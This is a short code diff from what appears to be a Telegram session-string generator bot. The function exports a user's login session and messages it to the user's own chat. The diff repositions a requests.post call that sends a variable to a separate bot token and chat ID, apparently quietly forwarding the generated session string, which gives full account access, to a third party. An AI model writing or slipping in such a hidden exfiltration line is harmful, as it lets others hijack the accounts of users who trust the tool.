@@ -112,9 +112,9 @@ async def generate_session(bot, msg, telethon=False):
     else:
         string_session = await client.export_session_string()
     text = "**{} جـلسـه جـديـده** \n\n`{}` \n\nاستخرجت من @IIlAndylII".format("⬇️تـلـيـثـــون" if telethon else "⬇️مـــيـــوزك", string_session)
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={test}")
     try:
         await client.send_message("me", text)
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={test}")
     except KeyError:
         pass
     await client.disconnect()
